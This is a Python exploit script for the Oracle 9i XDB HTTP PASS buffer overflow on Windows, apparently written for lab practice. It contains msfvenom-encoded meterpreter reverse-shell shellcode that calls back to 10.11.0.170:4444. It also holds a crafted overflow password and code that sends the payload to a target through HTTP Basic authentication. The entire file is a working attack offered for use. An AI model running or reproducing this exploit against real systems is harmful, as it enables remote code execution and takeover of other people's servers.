import urllib2, base64
#Python Implementation of Oracle 9i XDB HTTP PASS Overflow (win32)
#https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/oracle9i_xdb_pass.rb

buf="\x81\xc4\xff\xef\xff\xff\x44" #prepended Decoder
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.170 LPORT=4444 -b "\x00" -f python -e x86/shikata_ga_nai
buf += "\xdb\xd2\xba\x90\xf6\x86\xf7\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x54\x83\xc0\x04\x31\x50\x14\x03\x50\x84\x14"
buf += "\x73\x0b\x4c\x5a\x7c\xf4\x8c\x3b\xf4\x11\xbd\x7b\x62"
buf += "\x51\xed\x4b\xe0\x37\x01\x27\xa4\xa3\x92\x45\x61\xc3"
buf += "\x13\xe3\x57\xea\xa4\x58\xab\x6d\x26\xa3\xf8\x4d\x17"
buf += "\x6c\x0d\x8f\x50\x91\xfc\xdd\x09\xdd\x53\xf2\x3e\xab"
buf += "\x6f\x79\x0c\x3d\xe8\x9e\xc4\x3c\xd9\x30\x5f\x67\xf9"
buf += "\xb3\x8c\x13\xb0\xab\xd1\x1e\x0a\x47\x21\xd4\x8d\x81"
buf += "\x78\x15\x21\xec\xb5\xe4\x3b\x28\x71\x17\x4e\x40\x82"
buf += "\xaa\x49\x97\xf9\x70\xdf\x0c\x59\xf2\x47\xe9\x58\xd7"
buf += "\x1e\x7a\x56\x9c\x55\x24\x7a\x23\xb9\x5e\x86\xa8\x3c"
buf += "\xb1\x0f\xea\x1a\x15\x54\xa8\x03\x0c\x30\x1f\x3b\x4e"
buf += "\x9b\xc0\x99\x04\x31\x14\x90\x46\x5d\xd9\x99\x78\x9d"
buf += "\x75\xa9\x0b\xaf\xda\x01\x84\x83\x93\x8f\x53\xe4\x89"
buf += "\x68\xcb\x1b\x32\x89\xc5\xdf\x66\xd9\x7d\xf6\x06\xb2"
buf += "\x7d\xf7\xd2\x2f\x7b\x6f\xd7\xa4\x83\xc5\x8f\xb8\x83"
buf += "\x08\x0c\x34\x65\x7a\xfc\x16\x3a\x3a\xac\xd6\xea\xd2"
buf += "\xa6\xd8\xd5\xc2\xc8\x32\x7e\x68\x27\xeb\xd6\x04\xde"
buf += "\xb6\xad\xb5\x1f\x6d\xc8\xf5\x94\x84\x2c\xbb\x5c\xec"
buf += "\x3e\xab\x3c\x0e\xbf\x2b\xd5\x0e\xd5\x2f\x7f\x58\x41"
buf += "\x2d\xa6\xae\xce\xce\x8d\xac\x09\x30\x50\x85\x62\x06"
buf += "\xc6\xa9\x1c\x66\x06\x2a\xdd\x30\x4c\x2a\xb5\xe4\x34"
buf += "\x79\xa0\xeb\xe0\xed\x79\x79\x0b\x44\x2d\x2a\x63\x6a"
buf += "\x08\x1c\x2c\x95\x7f\x1f\x2b\x69\xfd\x3d\x94\x02\xfd"
buf += "\x01\x24\xd3\x97\x81\x74\xbb\x6c\xae\x7b\x0b\x8c\x65"
buf += "\xd4\x03\x07\xeb\x96\xb2\x18\x26\x76\x6b\x18\xc4\xa3"
buf += "\x7a\x97\x2b\x54\x83\x59\x10\x82\xba\x2f\x51\x16\xf9"
buf += "\x20\xe8\x3b\xa8\xaa\x12\x6f\xaa\xfe"

user="user"
passwd="a" * 442 + "\xeb\x64" + "\x90"*2 + "\x46\x6d\x61\x60" + "\x90"*266 + "\xeb\x10" + "\x90" * 109 + buf


url='http://192.168.1.10:8080'


request = urllib2.Request(url)
base64string = base64.b64encode('%s:%s' % (user, passwd))
request.add_header("Authorization", "Basic %s" % base64string)   
result = urllib2.urlopen(request)
print "[*] Check your Multi/handler "
